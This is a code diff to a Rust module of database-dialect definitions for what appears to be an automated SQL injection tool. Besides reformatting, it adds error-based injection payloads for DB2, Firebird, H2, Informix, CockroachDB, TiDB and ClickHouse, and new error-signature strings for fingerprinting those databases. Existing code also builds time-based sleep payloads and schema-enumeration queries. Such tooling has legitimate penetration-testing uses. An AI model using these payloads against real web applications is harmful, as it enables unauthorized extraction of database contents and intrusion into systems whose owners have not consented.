@@ -7,14 +7,16 @@ use super::dialect::DbmsDialect;
 
 pub struct Db2;
 impl DbmsDialect for Db2 {
-    fn name(&self) -> &'static str { "DB2" }
+    fn name(&self) -> &'static str {
+        "DB2"
+    }
 
     fn error_signatures(&self) -> &[(&'static str, &'static str)] {
         &[
-            ("DB2 SQL error",    "DB2"),
-            ("SQLCODE=",         "DB2"),
-            ("SQLSTATE=",        "DB2"),
-            ("[IBM][CLI Driver]","DB2"),
+            ("DB2 SQL error", "DB2"),
+            ("SQLCODE=", "DB2"),
+            ("SQLSTATE=", "DB2"),
+            ("[IBM][CLI Driver]", "DB2"),
         ]
     }
 
@@ -53,8 +55,21 @@ impl DbmsDialect for Db2 {
         format!(
             "SELECT colname FROM syscat.columns WHERE tabname='{}' \
              ORDER BY colno LIMIT 1 OFFSET {}",
-            table.to_uppercase(), index
+            table.to_uppercase(),
+            index
         )
+    }
+
+    /// DB2 error-based payloads via type conversion and XML errors
+    fn error_based_payloads(&self) -> Vec<(&'static str, &'static str)> {
+        vec![
+            // XML error via XMLPARSE
+            ("' AND XMLPARSE(DOCUMENT (SELECT (%s) FROM SYSIBM.SYSDUMMY1)) IS NOT NULL-- ", "XMLPARSE error"),
+            // Type conversion error
+            ("' AND CAST((SELECT (%s) FROM SYSIBM.SYSDUMMY1) AS INTEGER)=1-- ", "CAST to INTEGER error"),
+            // Recursion error via CTE
+            ("' AND (SELECT (%s) FROM (SELECT 1 FROM SYSIBM.SYSDUMMY1 CONNECT BY 1=1 START WITH 1=1 FETCH FIRST 1 ROW ONLY)x)=1-- ", "Recursive CTE error"),
+        ]
     }
 }
 
@@ -62,13 +77,15 @@ impl DbmsDialect for Db2 {
 
 pub struct Sybase;
 impl DbmsDialect for Sybase {
-    fn name(&self) -> &'static str { "Sybase" }
+    fn name(&self) -> &'static str {
+        "Sybase"
+    }
 
     fn error_signatures(&self) -> &[(&'static str, &'static str)] {
         &[
-            ("Sybase message",          "Sybase"),
-            ("Adaptive Server Anywhere","Sybase"),
-            ("Sybase SQL Server",       "Sybase"),
+            ("Sybase message", "Sybase"),
+            ("Adaptive Server Anywhere", "Sybase"),
+            ("Sybase SQL Server", "Sybase"),
         ]
     }
 
@@ -92,7 +109,10 @@ impl DbmsDialect for Sybase {
     }
 
     fn column_count_query(&self, table: &str) -> String {
-        format!("SELECT COUNT(*) FROM syscolumns WHERE id=OBJECT_ID('{}')", table)
+        format!(
+            "SELECT COUNT(*) FROM syscolumns WHERE id=OBJECT_ID('{}')",
+            table
+        )
     }
 
     fn column_name_query(&self, table: &str, index: usize) -> String {
@@ -107,13 +127,15 @@ impl DbmsDialect for Sybase {
 
 pub struct Firebird;
 impl DbmsDialect for Firebird {
-    fn name(&self) -> &'static str { "Firebird" }
+    fn name(&self) -> &'static str {
+        "Firebird"
+    }
 
     fn error_signatures(&self) -> &[(&'static str, &'static str)] {
         &[
-            ("Dynamic SQL Error",       "Firebird"),
-            ("Firebird/InterBase",      "Firebird"),
-            ("org.firebirdsql.jdbc",    "Firebird"),
+            ("Dynamic SQL Error", "Firebird"),
+            ("Firebird/InterBase", "Firebird"),
+            ("org.firebirdsql.jdbc", "Firebird"),
         ]
     }
 
@@ -152,8 +174,21 @@ impl DbmsDialect for Firebird {
         format!(
             "SELECT rdb$field_name FROM rdb$relation_fields WHERE rdb$relation_name='{}' \
              ORDER BY rdb$field_position ROWS 1 TO {}",
-            table.to_uppercase(), index + 1
+            table.to_uppercase(),
+            index + 1
         )
+    }
+
+    /// Firebird error-based payloads via type conversion
+    fn error_based_payloads(&self) -> Vec<(&'static str, &'static str)> {
+        vec![
+            // CAST error
+            ("' AND CAST((SELECT (%s) FROM rdb$database) AS INTEGER)=1-- ", "CAST to INTEGER error"),
+            // LIST function error
+            ("' AND (SELECT LIST(%s) FROM rdb$database) IS NOT NULL-- ", "LIST function error"),
+            // GEN_UUID context error
+            ("' AND (SELECT (%s) || GEN_UUID() FROM rdb$database) IS NOT NULL-- ", "GEN_UUID concat error"),
+        ]
     }
 }
 
@@ -161,13 +196,15 @@ impl DbmsDialect for Firebird {
 
 pub struct Hsqldb;
 impl DbmsDialect for Hsqldb {
-    fn name(&self) -> &'static str { "HSQLDB" }
+    fn name(&self) -> &'static str {
+        "HSQLDB"
+    }
 
     fn error_signatures(&self) -> &[(&'static str, &'static str)] {
         &[
-            ("unexpected token",    "HSQLDB"),
-            ("org.hsqldb.jdbc",     "HSQLDB"),
-            ("HSQLDB JDBC",         "HSQLDB"),
+            ("unexpected token", "HSQLDB"),
+            ("org.hsqldb.jdbc", "HSQLDB"),
+            ("HSQLDB JDBC", "HSQLDB"),
         ]
     }
 
@@ -206,7 +243,8 @@ impl DbmsDialect for Hsqldb {
         format!(
             "SELECT column_name FROM INFORMATION_SCHEMA.SYSTEM_COLUMNS \
              WHERE table_name='{}' LIMIT 1 OFFSET {}",
-            table.to_uppercase(), index
+            table.to_uppercase(),
+            index
         )
     }
 }
@@ -215,18 +253,24 @@ impl DbmsDialect for Hsqldb {
 
 pub struct H2;
 impl DbmsDialect for H2 {
-    fn name(&self) -> &'static str { "H2" }
+    fn name(&self) -> &'static str {
+        "H2"
+    }
 
     fn error_signatures(&self) -> &[(&'static str, &'static str)] {
         &[
-            ("org.h2.jdbc",             "H2"),
-            ("H2 JDBC",                 "H2"),
+            ("org.h2.jdbc", "H2"),
+            ("H2 JDBC", "H2"),
             ("SQLSyntaxErrorException", "H2"),
         ]
     }
 
     fn union_extraction_functions(&self) -> [&'static str; 3] {
-        ["(SELECT H2VERSION())", "(SELECT CURRENT_USER())", "(SELECT DATABASE())"]
+        [
+            "(SELECT H2VERSION())",
+            "(SELECT CURRENT_USER())",
+            "(SELECT DATABASE())",
+        ]
     }
 
     fn union_type_cast_wrappers(&self) -> Vec<&'static str> {
@@ -255,8 +299,21 @@ impl DbmsDialect for H2 {
         format!(
             "SELECT column_name FROM information_schema.columns WHERE table_name='{}' \
              ORDER BY ordinal_position LIMIT 1 OFFSET {}",
-            table.to_uppercase(), index
+            table.to_uppercase(),
+            index
         )
+    }
+
+    /// H2 error-based payloads via type conversion and XML
+    fn error_based_payloads(&self) -> Vec<(&'static str, &'static str)> {
+        vec![
+            // CAST error
+            ("' AND CAST((SELECT (%s)) AS INTEGER)=1-- ", "CAST to INTEGER error"),
+            // XML error
+            ("' AND XMLATTR((SELECT (%s)), 'x') IS NOT NULL-- ", "XMLATTR error"),
+            // Division by zero in conditional
+            ("' AND 1/(CASE WHEN (SELECT (%s)) IS NOT NULL THEN 0 ELSE 1 END)=1-- ", "Division by zero"),
+        ]
     }
 }
 
@@ -264,14 +321,16 @@ impl DbmsDialect for H2 {
 
 pub struct Informix;
 impl DbmsDialect for Informix {
-    fn name(&self) -> &'static str { "Informix" }
+    fn name(&self) -> &'static str {
+        "Informix"
+    }
 
     fn error_signatures(&self) -> &[(&'static str, &'static str)] {
         &[
-            ("SQL Error",              "Informix"),
-            ("IX000",                  "Informix"),
-            ("Informix ODBC Driver",   "Informix"),
-            ("[Informix]",             "Informix"),
+            ("SQL Error", "Informix"),
+            ("IX000", "Informix"),
+            ("Informix ODBC Driver", "Informix"),
+            ("[Informix]", "Informix"),
         ]
     }
 
@@ -314,19 +373,31 @@ impl DbmsDialect for Informix {
             table, index
         )
     }
+
+    /// Informix error-based payloads
+    fn error_based_payloads(&self) -> Vec<(&'static str, &'static str)> {
+        vec![
+            // Type conversion via TO_NUMBER
+            ("' AND TO_NUMBER((SELECT (%s) FROM systables WHERE tabid=1))=1-- ", "TO_NUMBER error"),
+            // Invalid date conversion
+            ("' AND (SELECT TO_DATE((%s)) FROM systables WHERE tabid=1) IS NOT NULL-- ", "TO_DATE error"),
+        ]
+    }
 }
 
 // ── Ingres ────────────────────────────────────────────────────────────────────
 
 pub struct Ingres;
 impl DbmsDialect for Ingres {
-    fn name(&self) -> &'static str { "Ingres" }
+    fn name(&self) -> &'static str {
+        "Ingres"
+    }
 
     fn error_signatures(&self) -> &[(&'static str, &'static str)] {
         &[
-            ("Ingres SQL",  "Ingres"),
-            ("II000",       "Ingres"),
-            ("[Ingres]",    "Ingres"),
+            ("Ingres SQL", "Ingres"),
+            ("II000", "Ingres"),
+            ("[Ingres]", "Ingres"),
         ]
     }
 
@@ -351,7 +422,10 @@ impl DbmsDialect for Ingres {
     }
 
     fn column_count_query(&self, table: &str) -> String {
-        format!("SELECT COUNT(*) FROM iicolumns WHERE table_name='{}'", table)
+        format!(
+            "SELECT COUNT(*) FROM iicolumns WHERE table_name='{}'",
+            table
+        )
     }
 
     fn column_name_query(&self, table: &str, index: usize) -> String {
@@ -366,9 +440,31 @@ impl DbmsDialect for Ingres {
 
 pub struct CockroachDb;
 impl DbmsDialect for CockroachDb {
-    fn name(&self) -> &'static str { "CockroachDB" }
+    fn name(&self) -> &'static str {
+        "CockroachDB"
+    }
 
-    fn error_signatures(&self) -> &[(&'static str, &'static str)] { &[] }
+    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
+        &[
+            // NOTE: "ERROR:" is too generic - matches PHP "Fatal error:"
+            // Use more specific CockroachDB/PostgreSQL patterns
+            ("ERROR:  syntax error", "CockroachDB"),
+            ("ERROR:  lexical error", "CockroachDB"),
+            ("ERROR:  unterminated", "CockroachDB"),
+            ("ERROR:  column", "CockroachDB"),
+            ("ERROR:  relation", "CockroachDB"),
+            // Only match SQLSTATE error codes (not warnings like 01xxx)
+            // Class 42 = Syntax Error or Access Rule Violation
+            // Class 25 = Invalid Transaction State  
+            // Class P0 = PL/pgSQL Error
+            ("SQLSTATE[42", "CockroachDB/PostgreSQL"),
+            ("SQLSTATE[25", "CockroachDB/PostgreSQL"),
+            ("SQLSTATE[P0", "CockroachDB/PostgreSQL"),
+            ("lexical error", "CockroachDB"),
+            ("syntax error", "CockroachDB"),
+            ("unterminated string", "CockroachDB"),
+        ]
+    }
 
     fn union_extraction_functions(&self) -> [&'static str; 3] {
         ["version()", "current_user()", "current_database()"]
@@ -410,11 +506,24 @@ impl DbmsDialect for CockroachDb {
     }
 
     fn conditional_sleep(&self, condition: &str, seconds: u64) -> String {
-        format!("CASE WHEN {} THEN pg_sleep({}) ELSE pg_sleep(0) END", condition, seconds)
+        format!(
+            "CASE WHEN {} THEN pg_sleep({}) ELSE pg_sleep(0) END",
+            condition, seconds
+        )
     }
 
     fn stacked_sleep_payload(&self, original_value: &str, seconds: u64) -> String {
         format!("{}'; SELECT pg_sleep({})-- ", original_value, seconds)
+    }
+
+    /// CockroachDB error-based payloads (PostgreSQL-compatible)
+    fn error_based_payloads(&self) -> Vec<(&'static str, &'static str)> {
+        vec![
+            // CAST error (same as PostgreSQL)
+            ("' AND 1=CAST((%s) AS INTEGER)-- ", "CAST to INTEGER error"),
+            // Type error via CRDB_INTERNAL
+            ("' AND crdb_internal.force_error('XX000', (%s)) IS NOT NULL-- ", "CRDB_INTERNAL error"),
+        ]
     }
 }
 
@@ -422,9 +531,13 @@ impl DbmsDialect for CockroachDb {
 
 pub struct TiDb;
 impl DbmsDialect for TiDb {
-    fn name(&self) -> &'static str { "TiDB" }
+    fn name(&self) -> &'static str {
+        "TiDB"
+    }
 
-    fn error_signatures(&self) -> &[(&'static str, &'static str)] { &[] }
+    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
+        &[]
+    }
 
     fn union_extraction_functions(&self) -> [&'static str; 3] {
         ["@@version", "user()", "database()"]
@@ -473,15 +586,36 @@ impl DbmsDialect for TiDb {
     fn stacked_sleep_payload(&self, original_value: &str, seconds: u64) -> String {
         format!("{}; SELECT SLEEP({})-- ", original_value, seconds)
     }
+
+    /// TiDB error-based payloads (MySQL-compatible)
+    fn error_based_payloads(&self) -> Vec<(&'static str, &'static str)> {
+        vec![
+            // XPATH error (same as MySQL)
+            ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(%s),0x7e))-- ", "XPATH EXTRACTVALUE"),
+            // JSON error
+            ("' AND JSON_KEYS((SELECT CONVERT((%s) USING utf8)))-- ", "JSON keys error"),
+            // TiDB specific: TIDB_DECODE_KEY error
+            ("' AND TIDB_DECODE_KEY((%s)) IS NOT NULL-- ", "TIDB_DECODE_KEY error"),
+        ]
+    }
 }
 
 // ── ClickHouse ────────────────────────────────────────────────────────────────
 
 pub struct ClickHouse;
 impl DbmsDialect for ClickHouse {
-    fn name(&self) -> &'static str { "ClickHouse" }
+    fn name(&self) -> &'static str {
+        "ClickHouse"
+    }
 
-    fn error_signatures(&self) -> &[(&'static str, &'static str)] { &[] }
+    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
+        &[
+            ("Code:", "ClickHouse"),
+            ("DB::Exception:", "ClickHouse"),
+            ("CANNOT_PARSE_TEXT", "ClickHouse"),
+            ("SYNTAX_ERROR", "ClickHouse"),
+        ]
+    }
 
     fn union_extraction_functions(&self) -> [&'static str; 3] {
         ["version()", "currentUser()", "currentDatabase()"]
@@ -500,11 +634,29 @@ impl DbmsDialect for ClickHouse {
     }
 
     fn column_count_query(&self, table: &str) -> String {
-        format!("SELECT COUNT(*) FROM system.columns WHERE table='{}'", table)
+        format!(
+            "SELECT COUNT(*) FROM system.columns WHERE table='{}'",
+            table
+        )
     }
 
     fn column_name_query(&self, table: &str, index: usize) -> String {
-        format!("SELECT name FROM system.columns WHERE table='{}' LIMIT 1 OFFSET {}", table, index)
+        format!(
+            "SELECT name FROM system.columns WHERE table='{}' LIMIT 1 OFFSET {}",
+            table, index
+        )
+    }
+
+    /// ClickHouse error-based payloads via type conversion
+    fn error_based_payloads(&self) -> Vec<(&'static str, &'static str)> {
+        vec![
+            // CAST error - ClickHouse returns error in body with Code: X
+            ("' AND CAST((SELECT (%s)) AS Int64)=1-- ", "CAST to Int64 error"),
+            // toInt64 error variant
+            ("' AND toInt64((SELECT (%s)))=1-- ", "toInt64 conversion error"),
+            // Date parsing error
+            ("' AND toDate((SELECT (%s))) IS NOT NULL-- ", "toDate conversion error"),
+        ]
     }
 
     fn sleep_function(&self, seconds: u64) -> String {
@@ -522,13 +674,12 @@ impl DbmsDialect for ClickHouse {
 
 pub struct Mckoi;
 impl DbmsDialect for Mckoi {
-    fn name(&self) -> &'static str { "Mckoi" }
+    fn name(&self) -> &'static str {
+        "Mckoi"
+    }
 
     fn error_signatures(&self) -> &[(&'static str, &'static str)] {
-        &[
-            ("com.mckoi.database", "Mckoi"),
-            ("Mckoi SQL",          "Mckoi"),
-        ]
+        &[("com.mckoi.database", "Mckoi"), ("Mckoi SQL", "Mckoi")]
     }
 
     fn union_extraction_functions(&self) -> [&'static str; 3] {
@@ -556,7 +707,10 @@ impl DbmsDialect for Mckoi {
     }
 
     fn column_name_query(&self, table: &str, index: usize) -> String {
-        format!("SELECT name FROM _Schema WHERE name='{}' LIMIT 1 OFFSET {}", table, index)
+        format!(
+            "SELECT name FROM _Schema WHERE name='{}' LIMIT 1 OFFSET {}",
+            table, index
+        )
     }
 }
 
@@ -564,13 +718,15 @@ impl DbmsDialect for Mckoi {
 
 pub struct Derby;
 impl DbmsDialect for Derby {
-    fn name(&self) -> &'static str { "Derby" }
+    fn name(&self) -> &'static str {
+        "Derby"
+    }
 
     fn error_signatures(&self) -> &[(&'static str, &'static str)] {
         &[
-            ("ERROR 42X",           "Derby"),
-            ("org.apache.derby",    "Derby"),
-            ("Derby SQL",           "Derby"),
+            ("ERROR 42X", "Derby"),
+            ("org.apache.derby", "Derby"),
+            ("Derby SQL", "Derby"),
         ]
     }
 
@@ -610,7 +766,8 @@ impl DbmsDialect for Derby {
             "SELECT columnname FROM sys.syscolumns \
              WHERE referenceid=(SELECT tableid FROM sys.systables WHERE tablename='{}') \
              OFFSET {} ROWS FETCH NEXT 1 ROW ONLY",
-            table.to_uppercase(), index
+            table.to_uppercase(),
+            index
         )
     }
 }
@@ -619,18 +776,24 @@ impl DbmsDialect for Derby {
 
 pub struct Cache;
 impl DbmsDialect for Cache {
-    fn name(&self) -> &'static str { "Cache" }
+    fn name(&self) -> &'static str {
+        "Cache"
+    }
 
     fn error_signatures(&self) -> &[(&'static str, &'static str)] {
         &[
             ("Caché SQL Error", "Cache"),
-            ("<SYNTAX>",        "Cache"),
-            ("[ODBC Cache]",    "Cache"),
+            ("<SYNTAX>", "Cache"),
+            ("[ODBC Cache]", "Cache"),
         ]
     }
 
     fn union_extraction_functions(&self) -> [&'static str; 3] {
-        ["(SELECT $ZVERSION)", "(SELECT $USERNAME)", "(SELECT $NAMESPACE)"]
+        [
+            "(SELECT $ZVERSION)",
+            "(SELECT $USERNAME)",
+            "(SELECT $NAMESPACE)",
+        ]
     }
 
     fn union_type_cast_wrappers(&self) -> Vec<&'static str> {
@@ -668,7 +831,9 @@ impl DbmsDialect for Cache {
 
 pub struct FrontBase;
 impl DbmsDialect for FrontBase {
-    fn name(&self) -> &'static str { "FrontBase" }
+    fn name(&self) -> &'static str {
+        "FrontBase"
+    }
 
     fn error_signatures(&self) -> &[(&'static str, &'static str)] {
         &[("FrontBase", "FrontBase")]
@@ -687,11 +852,17 @@ impl DbmsDialect for FrontBase {
     }
 
     fn table_name_query(&self, index: usize) -> String {
-        format!("SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {}", index)
+        format!(
+            "SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {}",
+            index
+        )
     }
 
     fn column_count_query(&self, table: &str) -> String {
-        format!("SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'", table)
+        format!(
+            "SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'",
+            table
+        )
     }
 
     fn column_name_query(&self, table: &str, index: usize) -> String {
@@ -707,13 +878,12 @@ impl DbmsDialect for FrontBase {
 
 pub struct MonetDb;
 impl DbmsDialect for MonetDb {
-    fn name(&self) -> &'static str { "MonetDB" }
+    fn name(&self) -> &'static str {
+        "MonetDB"
+    }
 
     fn error_signatures(&self) -> &[(&'static str, &'static str)] {
-        &[
-            ("MonetDB",   "MonetDB"),
-            ("sql: MDB",  "MonetDB"),
-        ]
+        &[("MonetDB", "MonetDB"), ("sql: MDB", "MonetDB")]
     }
 
     fn union_extraction_functions(&self) -> [&'static str; 3] {
@@ -729,11 +899,17 @@ impl DbmsDialect for MonetDb {
     }
 
     fn table_name_query(&self, index: usize) -> String {
-        format!("SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {}", index)
+        format!(
+            "SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {}",
+            index
+        )
     }
 
     fn column_count_query(&self, table: &str) -> String {
-        format!("SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'", table)
+        format!(
+            "SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'",
+            table
+        )
     }
 
     fn column_name_query(&self, table: &str, index: usize) -> String {
@@ -749,13 +925,15 @@ impl DbmsDialect for MonetDb {
 
 pub struct Virtuoso;
 impl DbmsDialect for Virtuoso {
-    fn name(&self) -> &'static str { "Virtuoso" }
+    fn name(&self) -> &'static str {
+        "Virtuoso"
+    }
 
     fn error_signatures(&self) -> &[(&'static str, &'static str)] {
         &[
-            (" Virtuoso ",            "Virtuoso"),
-            ("SR185",                 "Virtuoso"),
-            ("[ODBC Virtuoso Driver]","Virtuoso"),
+            (" Virtuoso ", "Virtuoso"),
+            ("SR185", "Virtuoso"),
+            ("[ODBC Virtuoso Driver]", "Virtuoso"),
         ]
     }
 
@@ -772,11 +950,17 @@ impl DbmsDialect for Virtuoso {
     }
 
     fn table_name_query(&self, index: usize) -> String {
-        format!("SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {}", index)
+        format!(
+            "SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {}",
+            index
+        )
     }
 
     fn column_count_query(&self, table: &str) -> String {
-        format!("SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'", table)
+        format!(
+            "SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'",
+            table
+        )
     }
 
     fn column_name_query(&self, table: &str, index: usize) -> String {
@@ -792,13 +976,12 @@ impl DbmsDialect for Virtuoso {
 
 pub struct Msql;
 impl DbmsDialect for Msql {
-    fn name(&self) -> &'static str { "mSQL" }
+    fn name(&self) -> &'static str {
+        "mSQL"
+    }
 
     fn error_signatures(&self) -> &[(&'static str, &'static str)] {
-        &[
-            ("mSQL",      "mSQL"),
-            ("Mini SQL",  "mSQL"),
-        ]
+        &[("mSQL", "mSQL"), ("Mini SQL", "mSQL")]
     }
 
     fn union_extraction_functions(&self) -> [&'static str; 3] {
@@ -814,11 +997,17 @@ impl DbmsDialect for Msql {
     }
 
     fn table_name_query(&self, index: usize) -> String {
-        format!("SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {}", index)
+        format!(
+            "SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {}",
+            index
+        )
     }
 
     fn column_count_query(&self, table: &str) -> String {
-        format!("SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'", table)
+        format!(
+            "SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'",
+            table
+        )
     }
 
     fn column_name_query(&self, table: &str, index: usize) -> String {
